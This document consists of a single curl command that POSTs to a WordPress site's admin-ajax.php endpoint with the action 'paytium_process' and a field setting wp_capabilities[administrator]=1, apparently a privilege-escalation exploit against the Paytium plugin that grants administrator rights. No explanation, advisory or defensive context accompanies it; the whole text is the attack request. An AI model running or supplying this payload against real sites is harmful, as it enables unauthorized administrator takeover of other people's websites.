curl -sS -X POST "$BASE/wp-admin/admin-ajax.php" -d "action=paytium_process&wp_capabilities[administrator]=1"
